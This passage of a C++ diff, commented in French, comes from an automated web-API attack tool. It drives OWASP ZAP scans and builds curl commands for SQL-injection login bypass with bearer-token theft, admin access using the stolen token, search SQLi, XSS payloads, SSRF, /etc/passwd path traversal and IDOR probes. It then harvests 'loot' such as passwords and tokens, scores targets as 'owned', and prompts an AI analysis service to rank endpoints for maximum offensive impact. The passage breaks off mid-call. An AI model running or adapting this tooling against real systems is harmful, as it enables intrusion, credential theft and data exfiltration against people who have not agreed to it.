+            if (seeds.insert(u).second) {
+                std::ostringstream a;
+                a << "http://" << zap_host << ":" << zap_port
+                  << "/JSON/core/action/accessUrl/?url=" << shell_escape_double_quotes(u) << "&followRedirects=true";
+                if (!zap_apikey.empty()) a << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+                zap_json_call(a.str(), "seed_" + std::to_string(std::hash<std::string>{}(u)));
+            }
+        };
+
+        if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
+            int cap = 0;
+            for (auto& it : trig["rest_endpoints"]) {
+                if (!it.is_string()) continue;
+                std::string u = it.get<std::string>();
+                // on seed une sélection variée mais bornée
+                if (++cap > 40) break;
+                push_seed(u);
+            }
+        }
+        // seed la racine
+        push_seed(root);
+    }
+
+    // 4.d Import des endpoints GraphQL dans ZAP (add-on GraphQL)
+    //
+    // trig["graphql_endpoints"] est rempli par harvest_api_triggers(...)
+    // On demande à ZAP d'importer une définition GraphQL via introspection
+    // en passant endurl=url=endpoint (le plugin s'occupera d'envoyer la query).
+    if (trig.contains("graphql_endpoints") && trig["graphql_endpoints"].is_array()) {
+        for (auto &it : trig["graphql_endpoints"]) {
+            if (!it.is_string()) continue;
+            std::string endpoint = it.get<std::string>();
+
+            // Construction de l'URL API ZAP pour importUrl
+            std::ostringstream u;
+            u << "http://" << zap_host << ":" << zap_port
+              << "/JSON/graphql/action/importUrl/?endurl="
+              << shell_escape_double_quotes(endpoint)
+              << "&url=" << shell_escape_double_quotes(endpoint);
+
+            if (!zap_apikey.empty()) {
+                u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+            }
+
+            zap_json_call(
+                u.str(),
+                "graphql_import_" +
+                std::to_string(std::hash<std::string>{}(endpoint))
+            );
+        }
+    }
+
+    // 4.d Spider classique
+    {
+        std::ostringstream u;
+        u << "http://" << zap_host << ":" << zap_port
+          << "/JSON/spider/action/scan/?url=" << shell_escape_double_quotes(root)
+          << "&recurse=true";
+        if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+        zap_json_call(u.str(), "spider_scan");
+    }
+
+    // 4.e AJAX Spider (DOM/XHR)
+    {
+        std::ostringstream u;
+        u << "http://" << zap_host << ":" << zap_port
+          << "/JSON/ajaxSpider/action/scan/?url=" << shell_escape_double_quotes(root);
+        if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+        zap_json_call(u.str(), "ajax_spider_scan");
+    }
+
+    // 4.f Active Scan ciblé (baseurl)
+    {
+        std::ostringstream u;
+        u << "http://" << zap_host << ":" << zap_port
+          << "/JSON/ascan/action/scan/?url=" << shell_escape_double_quotes(root)
+          << "&recurse=true";
+        if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+        zap_json_call(u.str(), "ascan_scan_root");
+    }
+
+    // ------------------------------------------------------------------
+    // 5) Attaques REST génériques (couvrent Juice Shop + d’autres apps)
+    // ------------------------------------------------------------------
+    std::vector<std::string> rest = trig.value("rest_endpoints", std::vector<std::string>{});
+
+    // 5.a Tentatives de Login (SQLi/by-pass) & extraction de token
+    fs::path token_file = workdir / "bearer_token.txt";
+    {
+        std::vector<std::string> login_paths;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("login")  != std::string::npos ||
+                l.find("signin") != std::string::npos ||
+                l.find("auth")   != std::string::npos)
+            {
+                login_paths.push_back(u);
+            }
+        }
+        if (login_paths.empty()) {
+            // fallback type DVGA / Juice Shop
+            login_paths.push_back(root + "/rest/user/login");
+        }
+
+        int i = 0;
+        for (auto& url : login_paths) {
+            ConfirmationCommand c{};
+            c.id          = "REST_LOGIN_SQLI_" + std::to_string(i);
+            c.description = "Attempt SQLi login on " + url;
+            c.outfile     = (workdir / ("rest_login_" + std::to_string(i) + ".json")).string();
+
+            // On construit le JSON proprement et on le met dans des guillemets pour le shell
+            nlohmann::json body = {
+                { "email",    "' OR 1=1--" },
+                { "password", "x" }
+            };
+
+            std::ostringstream oss;
+            oss << "("
+                << "curl -sk -H \"Content-Type: application/json\" "
+                << "--data-binary \""
+                << shell_escape_double_quotes(body.dump())
+                << "\" "
+                << shell_escape_double_quotes(url)
+                << " || true"
+                << ") | tee " << shell_escape_double_quotes(c.outfile)
+                << " | jq -r '.authentication.token"
+                             " // .data.token"
+                             " // .token"
+                             " // .access_token"
+                             " // .jwt"
+                             " // empty' 2>/dev/null | head -n1 > "
+                << shell_escape_double_quotes(token_file.string())
+                << " ; if [ -s " << shell_escape_double_quotes(token_file.string())
+                << " ]; then echo TOKEN_OK; else echo TOKEN_FAIL; fi";
+
+            c.command = oss.str();
+            plan.push_back(c);
+            ++i;
+        }
+    }
+
+    // 5.b Admin/priv endpoints avec Bearer (si token)
+    auto add_bearer_get = [&](const std::string& url, const std::string& tag){
+        ConfirmationCommand c{};
+        c.id          = "REST_BEARER_" + tag;
+        c.description = "Bearer GET " + url;
+        c.outfile     = (workdir / ("rest_bearer_" + tag + ".txt")).string();
+        std::ostringstream oss;
+        oss << "if [ -s " << shell_escape_double_quotes(token_file.string()) << " ]; then "
+            << "TOK=$(cat " << shell_escape_double_quotes(token_file.string()) << "); "
+            << "curl -sk -D - -H \"Authorization: Bearer ${TOK}\" "
+            << shell_escape_double_quotes(url)
+            << " | tee " << shell_escape_double_quotes(c.outfile)
+            << " ; else echo NO_TOKEN | tee " << shell_escape_double_quotes(c.outfile) << " ; fi";
+        c.command = oss.str();
+        plan.push_back(c);
+    };
+
+    {
+        // Heuristique : endpoints “admin/”, “/config”, “/users”
+        std::set<std::string> admin_like;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("/admin")!=std::string::npos || l.find("application-configuration")!=std::string::npos ||
+                l.find("/users")!=std::string::npos || l.find("/config")!=std::string::npos) {
+                admin_like.insert(u);
+            }
+        }
+        // si rien repéré → quelques fallbacks connus
+        if (admin_like.empty()) {
+            admin_like.insert(root + "/rest/admin/application-configuration");
+            admin_like.insert(root + "/rest/admin/users");
+        }
+        int i=0;
+        for (auto& u : admin_like) add_bearer_get(u, "ADMIN_" + std::to_string(i++));
+    }
+
+    // 5.c Recherche “q=” (SQLi) — compare cardinalité
+    {
+        std::vector<std::string> search_like;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("search") != std::string::npos ||
+                l.find("q=")     != std::string::npos)
+            {
+                search_like.push_back(u);
+            }
+        }
+        if (search_like.empty()) {
+            // fallback typique Juice Shop / DVGA
+            search_like.push_back(root + "/rest/products/search?q=");
+        }
+
+        int i = 0;
+        for (auto& u : search_like) {
+            ConfirmationCommand c{};
+            c.id          = "REST_SQLI_SEARCH_" + std::to_string(i);
+            c.description = "SQLi in search on " + u;
+            c.outfile     = (workdir / ("rest_sqli_search_" + std::to_string(i) + ".txt")).string();
+
+            std::ostringstream oss;
+            std::string ok_file   = (workdir / ("s_len_ok_"   + std::to_string(i) + ".txt")).string();
+            std::string sqli_file = (workdir / ("s_len_sqli_" + std::to_string(i) + ".txt")).string();
+
+            // baseline "normale"
+            std::string legit;
+            if (u.find("q=") != std::string::npos) {
+                legit = u + "banana";
+            } else {
+                legit = u + (u.find('?') == std::string::npos ? "?q=banana" : "&q=banana");
+            }
+
+            // payload SQLi : on encode l'apostrophe en %27 pour ne pas casser le shell
+            std::string sqli;
+            if (u.find("q=") != std::string::npos) {
+                sqli = u + "%27 OR 1=1--";
+            } else {
+                sqli = u + (u.find('?') == std::string::npos ? "?q=%27 OR 1=1--" : "&q=%27 OR 1=1--");
+            }
+
+            oss << "curl -sk " << shell_escape_double_quotes(legit)
+                << " | jq -r 'length' > " << shell_escape_double_quotes(ok_file)
+                << " ; "
+                << "curl -sk " << shell_escape_double_quotes(sqli)
+                << " | jq -r 'length' > " << shell_escape_double_quotes(sqli_file)
+                << " ; echo OK=$(cat " << shell_escape_double_quotes(ok_file)
+                << ") SQLI=$(cat " << shell_escape_double_quotes(sqli_file)
+                << ")";
+
+            c.command = oss.str() + " | tee " + shell_escape_double_quotes(c.outfile);
+            plan.push_back(c);
+            ++i;
+        }
+    }
+
+
+    // 5.d XSS stocké/refleté — endpoints comment/feedback/review
+    {
+        std::vector<std::string> xss_like;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("feedback")!=std::string::npos || l.find("comment")!=std::string::npos || l.find("review")!=std::string::npos)
+                xss_like.push_back(u);
+        }
+        if (xss_like.empty()) xss_like.push_back(root + "/api/Feedbacks"); // fallback JS
+
+        std::vector<std::string> payloads = {
+            R"({"comment":"<img src=x onerror=alert(1)>","rating":1})",
+            R"({"comment":"<iframe src=\"javascript:alert(1)\"></iframe>","rating":1})"
+        };
+        int i=0;
+        for (auto& url : xss_like) {
+            for (auto& body : payloads) {
+                ConfirmationCommand c{};
+                c.id          = "REST_XSS_POST_" + std::to_string(i);
+                c.description = "XSS attempt on " + url;
+                c.outfile     = (workdir / ("rest_xss_" + std::to_string(i) + ".txt")).string();
+                c.command     = "curl -sk -D - -H \"Content-Type: application/json\" --data-binary "
+                                + shell_escape_double_quotes(body) + " "
+                                + shell_escape_double_quotes(url)
+                                + " | tee " + shell_escape_double_quotes(c.outfile);
+                plan.push_back(c);
+                ++i;
+            }
+        }
+    }
+
+    // 5.e SSRF — paramètres url=*, endpoint=*, target=*
+    {
+        std::vector<std::string> ssrf_like;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("url=")!=std::string::npos || l.find("endpoint=")!=std::string::npos || l.find("target=")!=std::string::npos)
+                ssrf_like.push_back(u);
+        }
+        if (ssrf_like.empty()) {
+            // Essai générique GET sur /fetch?url=
+            ssrf_like.push_back(root + "/fetch?url=");
+        }
+        int i=0;
+        for (auto& u : ssrf_like) {
+            // test interne sur baseurl
+            std::string try1 = u.find('?')!=std::string::npos ? (u + root) : (u + "?url=" + root);
+            ConfirmationCommand c{};
+            c.id          = "REST_SSRF_" + std::to_string(i);
+            c.description = "SSRF attempt on " + u;
+            c.outfile     = (workdir / ("rest_ssrf_" + std::to_string(i) + ".txt")).string();
+            c.command     = "curl -sk -D - " + shell_escape_double_quotes(try1)
+                            + " | tee " + shell_escape_double_quotes(c.outfile);
+            plan.push_back(c);
+            ++i;
+        }
+    }
+
+    // 5.f Path Traversal simple — endpoints download/file/doc
+    {
+        std::vector<std::string> trav_like;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("download")!=std::string::npos || l.find("file")!=std::string::npos || l.find("doc")!=std::string::npos)
+                trav_like.push_back(u);
+        }
+        int i=0;
+        for (auto& u : trav_like) {
+            // Tentative naive: ajouter ../../etc/passwd sur un param file/name
+            std::string crafted;
+            if (u.find('?')!=std::string::npos) crafted = u + "&file=../../../../etc/passwd";
+            else                                crafted = u + "?file=../../../../etc/passwd";
+            ConfirmationCommand c{};
+            c.id          = "REST_TRAVERSAL_" + std::to_string(i);
+            c.description = "Path traversal attempt on " + u;
+            c.outfile     = (workdir / ("rest_traversal_" + std::to_string(i) + ".txt")).string();
+            c.command     = "curl -sk -D - " + shell_escape_double_quotes(crafted)
+                            + " | tee " + shell_escape_double_quotes(c.outfile);
+            plan.push_back(c);
+            ++i;
+        }
+    }
+
+    // 5.g IDOR — remplacer id=me / id curent par d’autres IDs (1..3)
+    {
+        std::vector<std::string> id_like;
+        for (auto& u : rest) {
+            std::string l = to_lower_copy(u);
+            if (l.find("id=")!=std::string::npos || l.find("/user/")!=std::string::npos)
+                id_like.push_back(u);
+        }
+        int i=0;
+        for (auto& u : id_like) {
+            for (int id=1; id<=3; ++id) {
+                std::string crafted = u;
+                // si déjà un id= dans la querystring, on remplace rapidement (= naïf mais utile)
+                auto pos = crafted.find("id=");
+                if (pos != std::string::npos) {
+                    auto end = crafted.find_first_of("&", pos+3);
+                    crafted.replace(pos+3, (end==std::string::npos? crafted.size()-(pos+3) : end-(pos+3)),
+                                    std::to_string(id));
+                } else {
+                    // sinon on ajoute ?id=id
+                    crafted += (crafted.find('?')!=std::string::npos ? "&" : "?");
+                    crafted += "id=" + std::to_string(id);
+                }
+                ConfirmationCommand c{};
+                c.id          = "REST_IDOR_" + std::to_string(i) + "_" + std::to_string(id);
+                c.description = "IDOR probe " + std::to_string(id) + " on " + u;
+                c.outfile     = (workdir / ("rest_idor_" + std::to_string(i) + "_" + std::to_string(id) + ".txt")).string();
+                c.command     = "curl -sk -D - " + shell_escape_double_quotes(crafted)
+                                + " | tee " + shell_escape_double_quotes(c.outfile);
+                plan.push_back(c);
+            }
+            ++i;
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // 6) Récap
+    // ------------------------------------------------------------------
+    plan_json["notes"].push_back("Generic REST+API flow prepared: OpenAPI/SOAP import, ZAP spider/ajax/ascan, login SQLi→token→admin, search SQLi, XSS, SSRF, traversal, IDOR.");
 }
 
 // ---------------------- CONSOLIDATION / SORTIES ------------------------------
@@ -5877,8 +7613,11 @@ static void analyse_postexploit_results_api(const std::string& baseurl,
                                             const fs::path& workdir)
 {
     using nlohmann::json;
+    namespace fs = std::filesystem;
 
+    // --------------------------------------------------------------------
     // 1) api_catalog.json
+    // --------------------------------------------------------------------
     json catalog;
     api_catalog_from_enum_files(workdir, catalog);
     try {
@@ -5886,27 +7625,51 @@ static void analyse_postexploit_results_api(const std::string& baseurl,
             << catalog.dump(2);
     } catch (...) {}
 
+    // --------------------------------------------------------------------
     // 2) api_auth_findings.json (+ ingestion tokens)
-    json findings = json::object();
-    findings["generated_at"] = current_datetime_string();
-    findings["findings"]     = json::array();
+    // --------------------------------------------------------------------
+    json auth_findings = json::object();
+    auth_findings["baseurl"]      = baseurl;
+    auth_findings["generated_at"] = current_datetime_string();
+    auth_findings["findings"]     = json::array();
+
+    auto is_sensitive_path = [](const std::string& p) {
+        std::string l = to_lower_copy(p);
+        return l.find("/admin")   != std::string::npos ||
+               l.find("/manage")  != std::string::npos ||
+               l.find("/config")  != std::string::npos ||
+               l.find("/settings")!= std::string::npos ||
+               l.find("/internal")!= std::string::npos ||
+               l.find("/private") != std::string::npos ||
+               l.find("/user/")   != std::string::npos ||
+               l.find("/account") != std::string::npos;
+    };
 
     for (auto& f : glob_files(workdir, "api_auth_bypass_")) {
         std::string txt      = slurp_if_exists(f);
+        if (txt.empty()) continue;
+
         std::string low      = to_lower_copy(txt);
         std::string endpoint = extract_url_from_line(txt);
         if (endpoint.empty()) endpoint = baseurl;
 
         bool ok =
-            (low.find(" 200")          != std::string::npos) ||
-            (low.find("http/1.1 200")  != std::string::npos) ||
-            (low.find("set-cookie:")   != std::string::npos);
+            (low.find("http/1.1 200") != std::string::npos) ||
+            (low.find("http/2 200")   != std::string::npos) ||
+            (low.find(" 200 OK")      != std::string::npos) ||
+            (low.find("set-cookie:")  != std::string::npos) ||
+            (low.find("token")        != std::string::npos);
 
-        findings["findings"].push_back({
-            {"file",     f.filename().string()},
-            {"endpoint", endpoint},
-            {"success",  ok}
-        });
+        bool critical = ok && is_sensitive_path(endpoint);
+
+        json entry = json::object();
+        entry["file"]      = f.filename().string();
+        entry["endpoint"]  = endpoint;
+        entry["success"]   = ok;
+        entry["critical"]  = critical;
+        entry["snippet"]   = txt.substr(0, 300);
+
+        auth_findings["findings"].push_back(entry);
 
         if (ok) {
             api_ingest_tokens_to_vault(workdir, endpoint, txt);
@@ -5915,35 +7678,89 @@ static void analyse_postexploit_results_api(const std::string& baseurl,
 
     try {
         std::ofstream(workdir / "api_auth_findings.json")
-            << findings.dump(2);
+            << auth_findings.dump(2);
     } catch (...) {}
 
-    // 3) graphql_loot.json
-    json gql = json::object();
-    gql["generated_at"] = current_datetime_string();
-    gql["loot"]         = json::array();
+    // --------------------------------------------------------------------
+    // 3) graphql_loot.json – introspection + enum + abus (login/idor)
+    // --------------------------------------------------------------------
+    json gql_loot = json::object();
+    gql_loot["baseurl"]      = baseurl;
+    gql_loot["generated_at"] = current_datetime_string();
+    gql_loot["entries"]      = json::array();
 
-    for (auto& f : glob_files(workdir, "graphql_abuse_loot_")) {
-        std::string txt = slurp_if_exists(f);
+    auto parse_graphql_json = [&](const fs::path& p) -> json {
+        std::string txt = slurp_if_exists(p);
+        if (txt.empty()) return json();
         auto lb = txt.find('{');
         auto rb = txt.rfind('}');
-        if (lb != std::string::npos &&
-            rb != std::string::npos &&
-            rb > lb) {
-            try {
-                gql["loot"].push_back(
-                    json::parse(txt.substr(lb, rb - lb + 1)));
-            } catch (...) {}
+        if (lb == std::string::npos || rb == std::string::npos || rb <= lb)
+            return json();
+        json j = json::parse(txt.substr(lb, rb - lb + 1), nullptr, false);
+        if (j.is_discarded()) return json();
+        return j;
+    };
+
+    fs::path gql_dir = workdir / "api_graphql";
+    if (fs::exists(gql_dir)) {
+        for (auto& f : glob_files(gql_dir, "introspection_")) {
+            json j = parse_graphql_json(f);
+            if (j.is_null()) continue;
+            json e;
+            e["file"]   = f.filename().string();
+            e["kind"]   = "introspection";
+            e["sample"] = j;
+            gql_loot["entries"].push_back(e);
         }
+        for (auto& f : glob_files(gql_dir, "enum_queries_")) {
+            json j = parse_graphql_json(f);
+            if (j.is_null()) continue;
+            json e;
+            e["file"]   = f.filename().string();
+            e["kind"]   = "enum_queries";
+            e["sample"] = j;
+            gql_loot["entries"].push_back(e);
+        }
+        for (auto& f : glob_files(gql_dir, "abuse_login_")) {
+            json j = parse_graphql_json(f);
+            if (j.is_null()) continue;
+            json e;
+            e["file"]   = f.filename().string();
+            e["kind"]   = "login_abuse";
+            e["sample"] = j;
+            gql_loot["entries"].push_back(e);
+        }
+        for (auto& f : glob_files(gql_dir, "abuse_idor_")) {
+            json j = parse_graphql_json(f);
+            if (j.is_null()) continue;
+            json e;
+            e["file"]   = f.filename().string();
+            e["kind"]   = "idor_abuse";
+            e["sample"] = j;
+            gql_loot["entries"].push_back(e);
+        }
+    }
+
+    for (auto& f : glob_files(workdir, "graphql_abuse_loot_")) {
+        json j = parse_graphql_json(f);
+        if (j.is_null()) continue;
+        json e;
+        e["file"]   = f.filename().string();
+        e["kind"]   = "legacy_abuse";
+        e["sample"] = j;
+        gql_loot["entries"].push_back(e);
     }
 
     try {
         std::ofstream(workdir / "graphql_loot.json")
-            << gql.dump(2);
+            << gql_loot.dump(2);
     } catch (...) {}
 
-    // 4) api_gateway_takeover.json
+    // --------------------------------------------------------------------
+    // 4) api_gateway_takeover.json – détection admin API GW
+    // --------------------------------------------------------------------
     json gw = json::object();
+    gw["baseurl"]         = baseurl;
     gw["generated_at"]    = current_datetime_string();
     gw["admin_responses"] = json::array();
 
@@ -5960,7 +7777,6 @@ static void analyse_postexploit_results_api(const std::string& baseurl,
             {"likely_open", admin}
         });
     }
-
     for (auto& f : glob_files(workdir, "api_gateway_tyk_")) {
         std::string txt = slurp_if_exists(f);
         std::string low = to_lower_copy(txt);
@@ -5980,18 +7796,356 @@ static void analyse_postexploit_results_api(const std::string& baseurl,
             << gw.dump(2);
     } catch (...) {}
 
-    // 5) Priorisation symbolique locale -> api_catalog_prioritized.json
+    // --------------------------------------------------------------------
+    // 5) api_attack_findings.json – SQLi / XSS / SSRF / Bearer / GraphQL
+    // --------------------------------------------------------------------
+    json attacks = json::object();
+    attacks["baseurl"]      = baseurl;
+    attacks["generated_at"] = current_datetime_string();
+    attacks["findings"]     = json::array();
+
+    auto push_finding = [&](const json& f){
+        attacks["findings"].push_back(f);
+    };
+
+    bool owned            = false;
+    std::string own_level = "info";
+    std::vector<std::string> own_reasons;
+
+    auto score_of = [](const std::string& lvl)->int{
+        if (lvl == "info")     return 0;
+        if (lvl == "low")      return 1;
+        if (lvl == "medium")   return 2;
+        if (lvl == "high")     return 3;
+        if (lvl == "critical") return 4;
+        return 0;
+    };
+    auto bump_level = [&](const std::string& lvl){
+        if (score_of(lvl) > score_of(own_level)) {
+            own_level = lvl;
+        }
+    };
+
+    bool has_admin_token                 = false;
+    bool has_db_loot                     = false;
+    bool has_confirmed_sqli              = false;
+    bool has_confirmed_xss               = false;
+    bool has_confirmed_ssrf              = false;
+    bool has_graphql_loot_sensitive      = false;
+    bool has_auth_bypass_critical_ep     = false;
+
+    // --- 5.a SQLi (delta de longueur + dumps HTTP) -----------------------
+    {
+        fs::path enumdir = workdir / "api_enum";
+
+        auto parse_ok_sqli = [](const std::string& line,
+                                long& ok, long& sqli) -> bool {
+            ok = 0; sqli = 0;
+            std::smatch m1, m2;
+            if (!std::regex_search(line, m1, std::regex("OK=([0-9]+)")))   return false;
+            if (!std::regex_search(line, m2, std::regex("SQLI=([0-9]+)"))) return false;
+            ok   = std::stol(m1[1].str());
+            sqli = std::stol(m2[1].str());
+            return true;
+        };
+
+        for (auto& p : glob_files(enumdir, "rest_sqli_summary")) {
+            std::string line = slurp_if_exists(p);
+            if (line.empty()) continue;
+            long ok=0, sqli=0;
+            if (!parse_ok_sqli(line, ok, sqli)) continue;
+            long delta = sqli - ok;
+            if (sqli > ok && delta > 0) {
+                json f;
+                f["type"]       = "sqli_length";
+                f["endpoint"]   = "unknown";
+                f["ok_count"]   = ok;
+                f["sqli_count"] = sqli;
+                f["delta"]      = delta;
+                f["file"]       = p.filename().string();
+                f["severity"]   = (delta >= 10 ? "high" : "medium");
+                f["confirmed"]  = true;
+                push_finding(f);
+
+                has_confirmed_sqli = true;
+                owned = true;
+                bump_level(f["severity"].get<std::string>());
+                own_reasons.push_back("SQLi détectée via delta de longueur");
+            }
+        }
+
+        for (auto& p : glob_files(enumdir, "sqli_")) {
+            std::string name = p.filename().string();
+            if (name.find("_summary") == std::string::npos) continue;
+            std::string line = slurp_if_exists(p);
+            if (line.empty()) continue;
+            long ok=0, sqli=0;
+            if (!parse_ok_sqli(line, ok, sqli)) continue;
+            long delta = sqli - ok;
+            if (sqli > ok && delta > 0) {
+                json f;
+                f["type"]       = "sqli_length";
+                f["endpoint"]   = "unknown";
+                f["ok_count"]   = ok;
+                f["sqli_count"] = sqli;
+                f["delta"]      = delta;
+                f["file"]       = name;
+                f["severity"]   = (delta >= 10 ? "high" : "medium");
+                f["confirmed"]  = true;
+                push_finding(f);
+
+                has_confirmed_sqli = true;
+                owned = true;
+                bump_level(f["severity"].get<std::string>());
+                own_reasons.push_back("SQLi détectée via delta de longueur");
+            }
+        }
+
+        // Loot SQLi – fichiers db_sqli_enum_* / db_sqli_dump_*
+        for (auto& p : glob_files(enumdir, "db_sqli_")) {
+            std::string body = slurp_if_exists(p);
+            if (body.empty()) continue;
+            std::string low = to_lower_copy(body);
+
+            bool sensitive =
+                (low.find("password") != std::string::npos) ||
+                (low.find("passwd")   != std::string::npos) ||
+                (low.find("hash")     != std::string::npos) ||
+                (low.find("token")    != std::string::npos) ||
+                (low.find("jwt")      != std::string::npos) ||
+                (low.find("session")  != std::string::npos) ||
+                (low.find("apikey")   != std::string::npos) ||
+                (low.find("api_key")  != std::string::npos) ||
+                (low.find("secret")   != std::string::npos) ||
+                (low.find("email")    != std::string::npos);
+
+            if (!sensitive) continue;
+
+            json f;
+            f["type"]      = "sqli_db_loot";
+            f["file"]      = p.filename().string();
+            f["severity"]  = "high";
+            f["confirmed"] = true;
+            push_finding(f);
+
+            has_db_loot = true;
+            owned       = true;
+            bump_level("high");
+            own_reasons.push_back("Loot DB sensible via SQLi HTTP");
+        }
+    }
+
+    // --- 5.b XSS – markers XSS_DARKMOON & payloads ----------------------
+    {
+        const std::vector<std::string> markers = {
+            "XSS_DARKMOON_",
+            "<img src=x onerror=alert(1)>",
+            "<script>alert(1)</script>",
+            "javascript:alert(1)"
+        };
+
+        for (auto& p : glob_files(workdir, "rest_xss_")) {
+            std::string body = slurp_if_exists(p);
+            if (body.empty()) continue;
+            bool hit = false;
+            for (const auto& m : markers) {
+                if (body.find(m) != std::string::npos) {
+                    hit = true; break;
+                }
+            }
+            if (!hit) continue;
+
+            json f;
+            f["type"]      = "xss";
+            f["file"]      = p.filename().string();
+            f["endpoint"]  = extract_url_from_line(body);
+            f["severity"]  = "high";
+            f["confirmed"] = true;
+            push_finding(f);
+
+            has_confirmed_xss = true;
+            owned = true;
+            bump_level("high");
+            own_reasons.push_back("XSS reflétée / stockée détectée");
+        }
+    }
+
+    // --- 5.c SSRF – rest_ssrf_* (200 + contenu interne) ------------------
+    {
+        for (auto& p : glob_files(workdir, "rest_ssrf_")) {
+            std::string body = slurp_if_exists(p);
+            if (body.empty()) continue;
+            std::string low = to_lower_copy(body);
+
+            bool status_ok =
+                (low.find("http/1.1 200") != std::string::npos) ||
+                (low.find("http/2 200")   != std::string::npos);
+
+            bool internal =
+                (low.find("169.254.169.254") != std::string::npos) ||
+                (low.find("metadata")        != std::string::npos) ||
+                (low.find("instance-id")     != std::string::npos) ||
+                (low.find("/etc/passwd")     != std::string::npos) ||
+                (low.find("root:x:")         != std::string::npos) ||
+                (low.find("db_version")      != std::string::npos) ||
+                (low.find("authorization:")  != std::string::npos);
+
+            if (!status_ok) continue;
+
+            json f;
+            f["type"]      = internal ? "ssrf_internal" : "ssrf_candidate";
+            f["file"]      = p.filename().string();
+            f["endpoint"]  = extract_url_from_line(body);
+            f["severity"]  = internal ? "critical" : "medium";
+            f["confirmed"] = true;
+            push_finding(f);
+
+            has_confirmed_ssrf = true;
+            bump_level(f["severity"].get<std::string>());
+            if (internal) {
+                owned = true;
+                own_reasons.push_back("SSRF confirmée vers ressource interne");
+            } else {
+                own_reasons.push_back("SSRF potentielle détectée");
+            }
+        }
+    }
+
+    // --- 5.d Bearer tokens & endpoints admin avec Bearer -----------------
+    {
+        fs::path token = workdir / "bearer_token.txt";
+        if (fs::exists(token)) {
+            std::string tok = slurp_if_exists(token);
+            if (!tok.empty()) {
+                json f;
+                f["type"]      = "bearer_token";
+                f["file"]      = token.filename().string();
+                f["preview"]   = (tok.size() > 60 ? tok.substr(0, 60) : tok);
+                f["severity"]  = "high";
+                f["confirmed"] = true;
+                push_finding(f);
+
+                has_admin_token = true;
+                bump_level("high");
+                own_reasons.push_back("Token Bearer obtenu via login/API");
+            }
+        }
+
+        for (auto& p : glob_files(workdir, "rest_bearer_")) {
+            std::string body = slurp_if_exists(p);
+            if (body.empty()) continue;
+            std::string low = to_lower_copy(body);
+
+            bool ok =
+                (low.find("http/1.1 200") != std::string::npos) ||
+                (low.find("http/2 200")   != std::string::npos);
+
+            if (!ok) continue;
+
+            json f;
+            f["type"]      = "admin_bearer_access";
+            f["file"]      = p.filename().string();
+            f["endpoint"]  = extract_url_from_line(body);
+            f["severity"]  = "critical";
+            f["confirmed"] = true;
+            push_finding(f);
+
+            has_admin_token = true;
+            owned = true;
+            bump_level("critical");
+            own_reasons.push_back("Accès à un endpoint via Bearer token");
+        }
+    }
+
+    // --- 5.e Loot GraphQL – champs sensibles dans gql_loot.entries -------
+    {
+        for (auto& e : gql_loot["entries"]) {
+            if (!e.contains("sample")) continue;
+            const json& s = e["sample"];
+            std::string dump = s.dump();
+            std::string low  = to_lower_copy(dump);
+
+            bool sensitive =
+                (low.find("password") != std::string::npos) ||
+                (low.find("passwd")   != std::string::npos) ||
+                (low.find("token")    != std::string::npos) ||
+                (low.find("jwt")      != std::string::npos) ||
+                (low.find("access_token") != std::string::npos) ||
+                (low.find("idtoken")  != std::string::npos) ||
+                (low.find("secret")   != std::string::npos) ||
+                (low.find("apikey")   != std::string::npos) ||
+                (low.find("api_key")  != std::string::npos) ||
+                (low.find("email")    != std::string::npos && low.find("admin") != std::string::npos);
+
+            if (!sensitive) continue;
+
+            json f;
+            f["type"]      = "graphql_loot";
+            f["file"]      = e.value("file", "?");
+            f["kind"]      = e.value("kind", "unknown");
+            f["severity"]  = "high";
+            f["confirmed"] = true;
+            push_finding(f);
+
+            has_graphql_loot_sensitive = true;
+            owned = true;
+            bump_level("high");
+            own_reasons.push_back("Exfiltration de données sensibles via GraphQL");
+
+            api_ingest_tokens_to_vault(workdir, "graphql", dump);
+        }
+    }
+
+    // --- 5.f Auth bypass critiques (à partir d’api_auth_findings.json) ---
+    for (const auto& e : auth_findings["findings"]) {
+        if (!e.value("success", false)) continue;
+        if (!e.value("critical", false)) continue;
+        has_auth_bypass_critical_ep = true;
+        owned = true;
+        bump_level("critical");
+        own_reasons.push_back("Auth bypass sur endpoint critique");
+    }
+
+    // --------------------------------------------------------------------
+    // 6) target_score.json – vue globale & drapeau 'owned'
+    // --------------------------------------------------------------------
+    json score = json::object();
+    score["baseurl"]      = baseurl;
+    score["generated_at"] = current_datetime_string();
+    score["owned"]        = owned;
+    score["max_severity"] = own_level;
+    score["reasons"]      = own_reasons;
+
+    json flags = json::object();
+    flags["has_admin_token"]             = has_admin_token;
+    flags["has_db_loot"]                 = has_db_loot;
+    flags["has_confirmed_sqli"]          = has_confirmed_sqli;
+    flags["has_confirmed_xss"]           = has_confirmed_xss;
+    flags["has_confirmed_ssrf"]          = has_confirmed_ssrf;
+    flags["has_graphql_loot_sensitive"]  = has_graphql_loot_sensitive;
+    flags["has_auth_bypass_critical_ep"] = has_auth_bypass_critical_ep;
+    score["flags"] = flags;
+
+    try {
+        std::ofstream(workdir / "target_score.json")
+            << score.dump(2);
+    } catch (...) {}
+
+    // --------------------------------------------------------------------
+    // 7) Priorisation symbolique via MCP -> api_catalog_prioritized.json
+    // --------------------------------------------------------------------
     try {
         std::string cat     = readFile((workdir / "api_catalog.json").string());
         std::string mcp_out = (workdir / "mcp_api_prioritize.out.txt").string();
         call_mcp_analyze(
             cat,
-            "Priorise les endpoints et opérations d’API pour maximiser les gains offensifs (BOLA/IDOR, admin, data exfil). Donne un JSON concis avec une clé 'urls' et une clé 'ops' ordonnées par priorité.",
+            "Priorise les endpoints et opérations d’API pour maximiser l’impact offensif. "
+            "Renvoie un JSON structuré avec une clé 'urls' et une clé 'ops' ordonnées par priorité.",
